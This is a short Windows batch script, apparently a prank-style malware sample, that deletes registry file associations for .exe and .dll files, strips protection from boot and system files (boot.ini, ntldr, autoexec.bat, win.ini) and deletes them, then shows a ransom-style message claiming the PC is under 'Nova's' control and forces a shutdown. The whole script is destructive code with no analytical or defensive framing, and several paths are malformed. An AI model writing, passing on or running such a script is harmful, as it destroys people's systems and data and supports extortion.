@echo off

START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/"

attrib -r -s -h c:autoexec.bat
del c:autoexec.bat
attrib -r -s -h c:boot.ini
del c:boot.ini
attrib -r -s -h c:ntldr
del c:ntldr
attrib -r -s -h c:windowswin.ini
del c:windowswin.ini
@echo off
msg *you are now under Nova's control ,  either worship him by paying  ransom or get yur pc taken over!!!
shutdown -s -t 7 -c "Critical a virus is taking over c:drive
